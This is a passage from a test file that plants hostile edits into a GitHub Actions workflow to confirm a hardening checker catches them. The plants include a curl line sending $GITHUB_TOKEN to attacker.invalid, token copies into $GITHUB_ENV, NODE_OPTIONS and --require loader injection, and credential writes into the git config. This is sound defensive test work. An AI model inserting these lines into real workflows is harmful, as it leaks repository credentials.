  if (/watch\.mjs[^\n]*--issues/.test(active)) out.push('still runs watch.mjs with --issues');
  if (!/node ops\/briefs-guard\.mjs/.test(active)) out.push('commits briefs without ops/briefs-guard.mjs');
  return out;
}

// The real watch.yml with one exact edit; throws when `find` is not there once, so a plant that no longer
// applies fails its case instead of passing silently.
function plantWorkflow(text, find, replace) {
  const i = text.indexOf(find);
  if (i < 0 || text.indexOf(find, i + 1) >= 0) throw new Error(`plant text ${JSON.stringify(find.slice(0, 50))} is not in watch.yml exactly once`);
  return text.slice(0, i) + replace + text.slice(i + find.length);
}

// The goldens listed in the confidence matrix of watch/freshness/README.md, and the golden files on disk.
export function goldenMatrixDrift(readme, files) {
  const listed = new Set([...readme.matchAll(/^\| `goldens\/([^`]+)` \|/gm)].map((m) => m[1]));
  const onDisk = new Set(files);
  return [
    ...[...onDisk].filter((f) => !listed.has(f)).map((f) => `goldens/${f} is not in the README golden confidence matrix`),
    ...[...listed].filter((f) => !onDisk.has(f)).map((f) => `the README matrix lists goldens/${f}, which does not exist`),
  ].sort();
}

function goldenFiles(dir, rel = '') {
  if (!existsSync(join(dir, rel))) return [];
  return readdirSync(join(dir, rel), { withFileTypes: true }).flatMap((e) => {
    const p = rel ? `${rel}/${e.name}` : e.name;
    if (e.isDirectory()) return goldenFiles(dir, p);
    return e.name.endsWith('.actual') || e.name === '.gitignore' ? [] : [p];
  });
}

const rest = [
  {
    id: 'HAR-D4-workflow', clauses: ['FR-D.4'], level: 'MUST',
    title: 'the scheduled watch runs --apply, never --issues, and guards the brief commit',
    run(ctx) {
      const c = checks();
      const real = watchWorkflowProblems(readFileSync(join(ctx.root, '.github/workflows/watch.yml'), 'utf8'));
      c.expect(real.length === 0, `watch.yml: ${real.join('; ')}`);
      const good = '        run: |\n          node watch/watch.mjs --apply\n          node ops/briefs-guard.mjs\n';
      c.expect(watchWorkflowProblems(good).length === 0, 'a good workflow is refused');
      c.expect(watchWorkflowProblems(good.replace('--apply', '--apply --issues')).some((p) => /--issues/.test(p)), 'a workflow still passing --issues is accepted');
      c.expect(watchWorkflowProblems(good.replace('          node watch', '          # node watch')).some((p) => /does not run/.test(p)), 'a commented-out watch run is accepted');
      c.expect(watchWorkflowProblems(good.replace('node ops/briefs-guard.mjs', 'true')).some((p) => /briefs-guard/.test(p)), 'an unguarded brief commit is accepted');
      return c.result();
    },
  },
  {
    id: 'HAR-O6-write-job', clauses: ['FR-O.6'], level: 'MUST',
    title: 'two jobs: build is read-only and main-only, publish alone writes, installs nothing, runs no build or gate and only listed scripts, and neither checkout persists credentials',
    run(ctx) {
      const c = checks();
      const text = readFileSync(join(ctx.root, '.github/workflows/watch.yml'), 'utf8');
      const probs = (t) => writeJobProblems(parseYaml(t), 'watch.yml');
      const real = probs(text);
      c.expect(real.length === 0, `watch.yml: ${real.join('; ')}`);
      const tok = '          GITHUB_TOKEN: ${{ github.token }}\n';
      const buildGuard = "  build:\n    # Main only, scheduled or dispatched by hand (FR-O.6). A dispatch from\n    # another branch is skipped, not run as a dry run.\n    if: github.ref == 'refs/heads/main'\n";
      const publishCheckout = '      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0\n        with:\n          persist-credentials: false\n';
      const download = '      - name: Download the generated files\n';
      const afterSync = '        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n';
      const plants = [
        ['build without the main-only guard', buildGuard, '  build:\n', /job build: lacks `if: github\.ref == 'refs\/heads\/main'`/],
        ['publish without the main-only guard', "    needs: build\n    if: github.ref == 'refs/heads/main'\n", '    needs: build\n', /job publish: lacks `if:/],
        ['write permission added to build', '    permissions:\n      contents: read\n', '    permissions:\n      contents: write\n', /job build: holds the permission `contents: write`/],
        ['build names no permissions and inherits a writing workflow', 'permissions: {}\n', 'permissions:\n  contents: write\n', /workflow-level permission `contents: write`/],
        ['build persists credentials', '          fetch-depth: 0\n          persist-credentials: false\n', '          fetch-depth: 0\n', /job build step 1 .*persist-credentials: false/],
        ['publish persists credentials', publishCheckout, publishCheckout.replace('false', 'true'), /job publish step 1 .*persist-credentials: false/],
        ['bun install in publish', download, `      - name: Install\n        run: bun install --frozen-lockfile\n\n${download}`, /job publish step \d+ \(Install\): installs, builds or runs gates/],
        ['a gate in publish', download, `      - name: Gates\n        run: bun run verify\n\n${download}`, /job publish step \d+ \(Gates\): installs, builds or runs gates/],
        ['setup-bun in publish', download, `      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0\n\n${download}`, /job publish step \d+ .*uses oven-sh\/setup-bun/],
        ['an unlisted script in publish', '          node ops/briefs-guard.mjs\n', '          node ops/briefs-guard.mjs\n          node watch/discover.mjs\n', /runs `node watch\/discover\.mjs`, which is not in PUBLISH_SCRIPTS/],
        ['inline node code in publish', '          node ops/briefs-guard.mjs\n', '          node ops/briefs-guard.mjs\n          node -e "require(\'./x\')"\n', /runs `node -e`, which is not in PUBLISH_SCRIPTS/],
        ['another interpreter in publish', '          node ops/briefs-guard.mjs\n', '          node ops/briefs-guard.mjs\n          bash ops/extra.sh\n', /runs an interpreter or script other than the listed node scripts/],
        ['a push after the sync', afterSync, `${afterSync}\n      - name: Push again\n        env:\n${tok}        run: git push origin HEAD:main\n`, /a git push \(step \d+\) follows the dashboard sync/],
        ['artifact downloaded into the checkout', 'path: ${{ runner.temp }}/watch-output', 'path: .', /downloads the artifact inside the checkout/],
        ['upload list drifts from PATHS (code uploaded)', '            site/briefs/*.html\n', '            site/briefs/*.html\n            watch/freshness/dashboard.mjs\n', /the upload lists .*not ops\/take-build-output\.mjs PATHS/],
        ['publish does not need build', '    needs: build\n', '', /does not need the build job/],
        ['a personal token reaches build', '        run: node watch/watch.mjs --apply\n', '        run: node watch/watch.mjs --apply\n        with:\n          pat: ${{ secrets.PERSONAL_TOKEN }}\n', /job build: references secrets\.PERSONAL_TOKEN/],
        ['token on the publish apply step (bracket notation)', '        id: commit\n', "        id: commit\n        env:\n          GH_TOKEN: ${{ secrets['GITHUB_TOKEN'] }}\n", /Apply the generated files.*receives the token \(env\) but is not the push or sync step/],
        ['token on the publish setup-node step', '          node-version: 22\n\n      # Outside', `          node-version: 22\n        env:\n${tok}\n      # Outside`, /job publish step 2 \(actions\/setup-node\): receives the token/],
        ['token in the workflow env', 'concurrency:\n', 'env:\n  GITHUB_TOKEN: ${{ github.token }}\nconcurrency:\n', /sets a workflow-level `env`/],
        ['push writes the token into .git/config', '          auth="$(', '          git config --local http.https://github.com/.extraheader "AUTHORIZATION: basic x"\n          auth="$(', /writes a credential into the Git config/],
        // Review 3d (GPT-6-Luna), O6-1: a permission scope the old list did not name, with the token handed on.
        ['review 3d O6-1: discussions: write in build', '      contents: read\n      issues: read\n', '      contents: read\n      issues: read\n      discussions: write\n', /job build: holds the permission `discussions: write`/],
        // Ours, O6-1: the shorthand.
        ['a build permission value that is neither read nor none (an expression)', '      issues: read\n', "      issues: ${{ github.event_name == 'schedule' && 'read' || 'write' }}\n", /job build: holds the permission `issues: \$\{\{/],
        ['build permissions: write-all', '    permissions:\n      contents: read\n      issues: read\n', '    permissions: write-all\n', /job build: holds the permission `write-all`/],
        // Review 3d, O6-2: a loader variable on the sync step, which holds the write token.
        ['review 3d O6-2: NODE_OPTIONS on the sync step', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', '          NODE_OPTIONS: --import=/tmp/canary.mjs\n        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', /Sync the dashboard.*sets env NODE_OPTIONS; publish steps may set only GITHUB_TOKEN/],
        // Ours, O6-2: a node flag before the script, a variable set from run text, the path channel, a shell override.
        ['node --require before an allowlisted script', '          node ops/briefs-guard.mjs\n', '          node --require ./hook.cjs ops/briefs-guard.mjs\n', /runs `node --require`, which is not in PUBLISH_SCRIPTS/],
        ['review 3c (a): push copies the token into $GITHUB_ENV', '          auth="$(', '          echo "GH_TOKEN_ALIAS=$GITHUB_TOKEN" >> "$GITHUB_ENV"\n          auth="$(', /Push.*names a loader or environment channel \(GITHUB_ENV\)/],
        ['a prepended PATH entry through $GITHUB_PATH', '          node ops/briefs-guard.mjs\n', '          echo "$RUNNER_TEMP/watch-output" >> "$GITHUB_PATH"\n          node ops/briefs-guard.mjs\n', /names a loader or environment channel \(GITHUB_PATH\)/],
        ['NODE_OPTIONS as an inline assignment', '          node ops/briefs-guard.mjs\n', '          NODE_OPTIONS=--import=./x.mjs node ops/briefs-guard.mjs\n', /names a loader or environment channel \(NODE_OPTIONS\)/],
        ['node called by path', '          node ops/briefs-guard.mjs\n', '          /usr/bin/node ops/briefs-guard.mjs\n', /runs an interpreter or script other than the listed node scripts/],
        ['a shell override on the sync step', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', '        shell: node --import=./x.mjs {0}\n        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', /sets `shell`/],
        ['an expression in publish run text', '          node ops/briefs-guard.mjs\n', '          node ops/briefs-guard.mjs ${{ steps.commit.outputs.committed }}\n', /puts a `\$\{\{ \}\}` expression into its run text/],
        ['job-level defaults in publish', '    needs: build\n', '    needs: build\n    defaults:\n      run:\n        shell: bash\n', /sets job-level `defaults`/],
        // Review 3d, O6-3: the publish actions on moving tags.
        ['review 3d O6-3: publish checkout on a tag', publishCheckout, publishCheckout.replace('@11d5960a326750d5838078e36cf38b85af677262', '@v4'), /job publish step 1 .*uses actions\/checkout@v4, not pinned/],
        ['review 3d O6-3: download-artifact on a tag', 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c', 'actions/download-artifact@v8', /uses actions\/download-artifact@v8, not pinned/],
        // Ours, O6-3: a short SHA in build.
        ['build setup-bun on a short SHA', 'oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6', 'oven-sh/setup-bun@0c5077e', /job build step \d+ .*uses oven-sh\/setup-bun@0c5077e, not pinned/],
        // Review 3e (GPT-6-Luna): the push step is allowed the token by its role, so its content is pinned too.
        ['review 3e: exfiltration appended to the token-bearing push step', '        push origin "HEAD:${GITHUB_REF_NAME}"\n', '        push origin "HEAD:${GITHUB_REF_NAME}"\n          curl --data-binary "$GITHUB_TOKEN" https://attacker.invalid/collect\n', /step \d+ \(Push\): run body differs from the reviewed text at line 6: reviewed "<end>", found "curl --data-binary \\"\$GITHUB_TOKEN\\" https:\/\/attacker\.invalid\/collect"/],
        ['a harmless-looking extra echo on the commit step', '          echo "committed=true" >> "$GITHUB_OUTPUT"\n', '          echo "committed=true" >> "$GITHUB_OUTPUT"\n          echo done\n', /\(Apply the generated files and commit them\): run body differs from the reviewed text at line 17: reviewed "<end>", found "echo done"/],
        ['the sync command given an extra flag', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json\n', '        run: node watch/freshness/dashboard.mjs --sync watch/live.json --dry-run\n', /\(Sync the dashboard issue from the committed watch\/live\.json\): run body differs from the reviewed text at line 1/],
        ['a new publish step', '      - name: Push\n', '      - name: Report\n        run: git log -1 --stat\n\n      - name: Push\n', /step \d+ \(Report\): runs text under a name PUBLISH_RUNS does not hold/],
        ['a changed comment line in the push step', '# .git/config. A plain push', '# .git/config. ${{ github.token }} A plain push', /\(Push\): run body differs from the reviewed text at line 2/],
        ['the push step renamed', '      - name: Push\n', '      - name: Push it\n', /has no step named "Push" running the reviewed body/],
      ];
      for (const [name, find, replace, want] of plants) {
        let p;
        try { p = probs(plantWorkflow(text, find, replace)); } catch (e) { c.expect(false, `${name}: ${e.message}`); continue; }
        c.expect(p.some((x) => want.test(x)), `${name}: not reported (got ${p.join(' | ') || 'nothing'})`);
      }
      // Harmless by construction, so the structure check must still pass: the watch step passes its token
      // to the build step through $GITHUB_OUTPUT (review 3c, GPT-6-Luna), or the build step names the token
      // in bracket notation (review 3b). Either way it is the build job's token, which is read-only
      // (contents: read, issues: read): it cannot push or edit an issue. The $GITHUB_ENV copy in the push
      // step, inert under review 3c, is now reported above, because publish run text may name no
      // environment channel at all.
      const inert = [
        ['review 3c (b): watch hands its token to build via $GITHUB_OUTPUT', '        run: node watch/watch.mjs --apply\n', '        id: watch\n        run: |\n          node watch/watch.mjs --apply\n          echo "freshness-token=${{ github.token }}" >> "$GITHUB_OUTPUT"\n\n      - name: Read it back\n        env:\n          GH_TOKEN: ${{ steps.watch.outputs[\'freshness-token\'] }}\n        run: node site/scripts/make-live.mjs\n'],
        ['review 3b (1): bracket-notation token on the build step', '      - name: Build (cards, feed, report)\n', "      - name: Build (cards, feed, report)\n        env:\n          GH_TOKEN: ${{ secrets['GITHUB_TOKEN'] }}\n"],
        ['build permissions: read-all', '    permissions:\n      contents: read\n      issues: read\n', '    permissions: read-all\n'],
      ];
      for (const [name, find, replace] of inert) {
        let p;
        try { p = probs(plantWorkflow(text, find, replace)); } catch (e) { c.expect(false, `${name}: ${e.message}`); continue; }
        c.expect(p.length === 0, `${name}: expected no finding, the job boundary makes it harmless (got ${p.join(' | ')})`);
      }
      const rv = { A: ['x', 'y'] };
      c.expect(runBodyProblems([{ name: 'A', run: 'x\ny\n\n' }], 'p', rv).length === 0, 'trailing newlines are not the only normalisation allowed');
      c.expect(runBodyProblems([{ name: 'A', run: 'x\ny ' }], 'p', rv).some((m) => /line 2: reviewed "y", found "y "/.test(m)), 'a trailing space passes the comparison');
      c.expect(runBodyProblems([{ name: 'A', run: 'x\n\ny' }], 'p', rv).some((m) => /line 2/.test(m)), 'an inserted blank line passes the comparison');
      c.expect(runBodyProblems([{ name: 'A', run: 'x\ny' }, { name: 'A', run: 'x\ny' }], 'p', rv).some((m) => /runs the reviewed step "A" 2 times/.test(m)), 'a repeated reviewed step passes');
      c.expect(runBodyProblems([], 'p', rv).some((m) => /has no step named "A"/.test(m)), 'a missing reviewed step passes');
      c.expect(runBodyProblems([{ name: 'toString', run: 'x' }], 'p', rv).some((m) => /does not hold/.test(m)), 'an inherited property name counts as reviewed');
      const wf = parseYaml(text);
      c.expect(Object.values(wf.jobs.build.permissions).every((v) => v === 'read' || v === 'none'),
        'the inert plants rest on build being read-only, and it is not');
      return c.result();
    },
  },
  {
    id: 'HAR-O6-publish-deps', clauses: ['FR-O.6'], level: 'MUST',
    title: 'every script the publish job runs imports only Node built-ins and repository files, all the way down',
    run(ctx) {
      const c = checks();
      const real = dependencyProblems(ctx.root);
      c.expect(real.problems.length === 0 && real.files >= 5, `${real.files} files: ${real.problems.join('; ')}`);
      const main = ['a.mjs'];
      const cases = [
        ['a package import', { 'a.mjs': "import x from 'left-pad';\n" }, /imports the package `left-pad`/],
        ['a package two files down', { 'a.mjs': "import './b.mjs';\n", 'b.mjs': "export { y } from './c.mjs';\n", 'c.mjs': "import {\n  z,\n} from 'lodash';\n" }, /c\.mjs: imports the package `lodash`/],
        ['a non-literal dynamic import', { 'a.mjs': 'const m = await import(name);\n' }, /non-literal import/],
        ['a require of a package', { 'a.mjs': "const r = require('chalk');\n" }, /imports the package `chalk`/],
        ['an import outside the repository', { 'a.mjs': "import '../../etc/x.mjs';\n" }, /outside the repository/],
        ['a missing file', { 'a.mjs': "import './gone.mjs';\n" }, /gone\.mjs: imported by a publish script but missing/],
        ['a header comment with a glob before the imports, and a `*/` later in the code', { 'a.mjs': "// reads packets/*-assessment.md\nimport x from 'left-pad';\nconst re = /a*/;\n" }, /imports the package `left-pad`/],
      ];
      for (const [name, files, want] of cases) {
        withTmp((dir) => {
          for (const [f, t] of Object.entries(files)) put(dir, f, t);
          const p = dependencyProblems(dir, main).problems;
          c.expect(p.some((x) => want.test(x)), `${name}: not reported (got ${p.join(' | ') || 'nothing'})`);
        });
      }
      withTmp((dir) => {
        put(dir, 'a.mjs', "import { readFileSync } from 'node:fs';\nimport fs from 'fs';\nimport { b } from './b.mjs';\nconst m = await import('./b.mjs');\n");
        put(dir, 'b.mjs', 'export const b = 1;\n');
        const p = dependencyProblems(dir, main);
        c.expect(p.problems.length === 0 && p.files === 2, `built-ins, a repo file and a literal import() are refused: ${p.problems.join(' | ')}`);
      });
      c.expect(JSON.stringify(importSpecifiers("import a from './x.mjs';\nexport * from 'node:fs';\nimport('y');\n")) === JSON.stringify(['./x.mjs', 'node:fs', 'y']), 'import specifiers are misread');
      return c.result();
    },
  },
  {
    id: 'HAR-O6-artifact', clauses: ['FR-O.6'], level: 'MUST',
    title: 'the publish job copies in only generated paths from the artifact, and nothing at all when the artifact holds anything else',
    run() {
      const c = checks();
      const good = ['watch/state.json', 'watch/census/2026-09-25.tsv', 'watch/changes/2026-09-25.json', 'watch/freshness/REPORT.md', 'site/feed.xml', 'site/briefs/frankengit.html'];
      withTmp((dir) => {
        const art = join(dir, 'art'), repo = join(dir, 'repo');
        for (const f of good) put(art, f, `new ${f}\n`);
        put(repo, 'watch/state.json', 'old\n');
        const r = takeBuildOutput(art, repo);
        c.expect(r.problems.length === 0 && r.files.length === good.length, `a clean artifact is refused: ${r.problems.join(' | ')}`);
        c.expect(readFileSync(join(repo, 'watch/state.json'), 'utf8') === 'new watch/state.json\n', 'a generated file was not copied');
      });
      const bad = [
        ['a script the publish job runs', 'watch/freshness/dashboard.mjs', /dashboard\.mjs: not a generated path/],
        ['the briefs guard', 'ops/briefs-guard.mjs', /briefs-guard\.mjs: not a generated path/],
        ['a workflow', '.github/workflows/watch.yml', /watch\.yml: not a generated path/],
        ['a census file one directory too deep', 'watch/census/x/2026.tsv', /census\/x\/2026\.tsv: not a generated path/],
        ['a brief with another extension', 'site/briefs/frankengit.js', /frankengit\.js: not a generated path/],
      ];
      for (const [name, extra, want] of bad) {
        withTmp((dir) => {
          const art = join(dir, 'art'), repo = join(dir, 'repo');
          put(art, 'watch/state.json', 'new\n');
          put(art, extra, 'planted\n');
          put(repo, 'watch/state.json', 'old\n');
          const r = takeBuildOutput(art, repo);
          c.expect(r.problems.some((x) => want.test(x)), `${name}: not refused (got ${r.problems.join(' | ') || 'nothing'})`);
          c.expect(readFileSync(join(repo, 'watch/state.json'), 'utf8') === 'old\n' && !existsSync(join(repo, extra)), `${name}: files were copied despite the problem`);
        });
      }
      withTmp((dir) => {
        mkdirSync(join(dir, 'art'));
        c.expect(listArtifact(join(dir, 'art')).problems.some((x) => /holds no files/.test(x)), 'an empty artifact is accepted');
      });
      c.expect(PATHS.every((p) => !/\.mjs$|\.js$|\.sh$|\.ya?ml$/.test(p)), 'PATHS lists a code file');
      // Destination side (review 3d O6-4, GPT-6-Luna, plus ours): a symlink or a non-file in the checkout
      // must not redirect an allowed generated path; the refusal is atomic, so the clean file in the same
      // artifact is not written either.
      const dest = [
        ['review 3d O6-4: REPORT.md in the checkout is a symlink to the briefs guard', (repo) => { put(repo, 'ops/briefs-guard.mjs', 'guard\n'); symlinkSync('../../ops/briefs-guard.mjs', join(repo, 'watch/freshness/REPORT.md')); }, 'watch/freshness/REPORT.md', /REPORT\.md: destination component watch\/freshness\/REPORT\.md is a symlink/],
        ['a destination directory in the checkout is a symlink to ops/', (repo) => { put(repo, 'ops/briefs-guard.mjs', 'guard\n'); symlinkSync('../ops', join(repo, 'watch/census')); }, 'watch/census/briefs-guard.tsv', /destination component watch\/census is a symlink/],
        ['the destination exists as a directory', (repo) => mkdirSync(join(repo, 'watch/live.json'), { recursive: true }), 'watch/live.json', /live\.json: destination exists and is not a regular file/],
        ['a destination parent exists as a file', (repo) => put(repo, 'site/briefs', 'a file\n'), 'site/briefs/frankengit.html', /destination component site\/briefs is not a directory/],
      ];
      for (const [name, prepare, rel, want] of dest) {
        withTmp((dir) => {
          const art = join(dir, 'art'), repo = join(dir, 'repo');
          put(art, 'watch/state.json', 'new\n');
          put(art, rel, 'planted\n');
          put(repo, 'watch/state.json', 'old\n');
          mkdirSync(join(repo, 'watch/freshness'), { recursive: true });
          prepare(repo);
          const r = takeBuildOutput(art, repo);
          c.expect(r.problems.some((x) => want.test(x)), `${name}: not refused (got ${r.problems.join(' | ') || 'nothing'})`);
          c.expect(readFileSync(join(repo, 'watch/state.json'), 'utf8') === 'old\n', `${name}: the clean file was written despite the refusal`);
          if (existsSync(join(repo, 'ops/briefs-guard.mjs'))) c.expect(readFileSync(join(repo, 'ops/briefs-guard.mjs'), 'utf8') === 'guard\n', `${name}: the briefs guard was overwritten`);
        });
      }
      return c.result();
    },
  },
  {
    id: 'HAR-D5-order', clauses: ['FR-D.5'], level: 'MUST',
    title: 'the gates run in build before its upload; publish needs build and applies, guards, pushes and syncs, in that order, and nothing pushes after the sync',
    run(ctx) {
      const c = checks();
      const wf = parseYaml(readFileSync(join(ctx.root, '.github/workflows/watch.yml'), 'utf8'));
      const real = [...orderProblems(wf.jobs.publish.steps, 'publish'), ...buildProblems(wf.jobs.build, 'build')];
      c.expect(real.length === 0, `watch.yml: ${real.join('; ')}`);
      c.expect([].concat(wf.jobs.publish.needs ?? []).includes('build'), 'publish does not need build');
      const tok = { GITHUB_TOKEN: '${{ github.token }}' };
      const take = { run: 'node ops/take-build-output.mjs "$RUNNER_TEMP/out"' };
      const guard = { run: 'node ops/briefs-guard.mjs' };
      const push = { run: 'git -c x=y \\\n  push origin HEAD:main', env: tok };
      const sync = { run: SYNC, env: tok };
      c.expect(orderProblems([take, guard, push, sync], 'p').length === 0, 'a good order is refused');
      const has = (steps, re) => orderProblems(steps, 'p').some((p) => re.test(p));
      c.expect(has([take, guard, sync, push], /does not come after the push/), 'a sync before the push is accepted');
      c.expect(has([take, guard, push], /no step runs/), 'a missing sync is accepted');
      c.expect(has([take, guard, push, sync, push], /follows the dashboard sync/), 'a push after the sync is accepted');
      c.expect(has([guard, take, push, sync], /briefs guard before applying/), 'a guard before the apply is accepted');
      c.expect(has([take, push, guard, sync], /pushes before the briefs guard/), 'a push before the guard is accepted');
      c.expect(has([guard, push, sync], /never applies the artifact/), 'a publish without the apply is accepted');
      c.expect(has([take, guard, push, { run: SYNC }], /no token/), 'a sync step without a token is accepted');
      c.expect(has([take, guard, { run: '# git push origin HEAD:main', env: tok }, sync], /never pushes/), 'a commented-out push counts as a push');
      const upload = { uses: 'actions/upload-artifact@x', with: { path: PATHS.join('\n') } };
      const b = (steps) => buildProblems({ permissions: { contents: 'read' }, steps }, 'b');
      c.expect(b([{ run: 'bun run verify' }, upload]).length === 0, 'a good build is refused');
      c.expect(b([upload, { run: 'bun run verify' }]).some((p) => /uploads before the gate chain/.test(p)), 'an upload before the gates is accepted');
      c.expect(b([upload]).some((p) => /runs no gate chain/.test(p)), 'a build without gates is accepted');
      return c.result();
    },
  },
  {
    id: 'HAR-L5-commit-guard', clauses: ['FR-L.5'], level: 'MUST',
    title: 'the scheduled commit may change a brief only inside its live:card region',
    run() {
      const c = checks();
      const before = '<h1>x</h1>\n<!-- live:card --><p>old</p><!-- /live:card -->\n<p>body</p>\n';
      c.expect(outsideRegionChange(before, before.replace('old', 'new')) === null, 'a region-only change is refused');
      c.expect(/outside the live:card region at line 3/.test(outsideRegionChange(before, before.replace('body', 'edited')) ?? ''), 'a change outside the region is accepted or misplaced');
      c.expect(/staged file has 0/.test(outsideRegionChange(before, '<h1>x</h1>\n<p>body</p>\n') ?? ''), 'a removed region is accepted');
      c.expect(/staged file has 2/.test(outsideRegionChange(before, `${before}<!-- live:card --><!-- /live:card -->\n`) ?? ''), 'a second region is accepted');
      c.expect(/HEAD has 0/.test(outsideRegionChange('<p>no card</p>\n', before) ?? ''), 'a first insertion by the bot is accepted');
      return c.result();
    },
  },
  {
    id: 'HAR-H3-golden-matrix', clauses: ['FR-H.3'], level: 'MUST',
    title: 'every golden file is in the README confidence matrix, and every matrix row names a golden that exists',
    run(ctx) {
      const c = checks();
      const readme = readFileSync(join(ctx.root, 'watch/freshness/README.md'), 'utf8');
      const real = goldenMatrixDrift(readme, goldenFiles(join(ctx.root, 'watch/freshness/goldens')));
      c.expect(real.length === 0, real.join('; '));
      const row = '| `goldens/a/x.md` | fixture | Y | N | 2 | exact |\n';
      c.expect(goldenMatrixDrift(row, ['a/x.md']).length === 0, 'a matching matrix is refused');
      c.expect(/goldens\/a\/y\.md is not in/.test(goldenMatrixDrift(row, ['a/x.md', 'a/y.md']).join()), 'an unlisted golden is accepted');
      c.expect(/lists goldens\/a\/x\.md, which does not exist/.test(goldenMatrixDrift(row, []).join()), 'a listed golden that is gone is accepted');
      return c.result();
    },
  },
];

export default [...h2, ...h8, ...h6, ...o, ...rest];
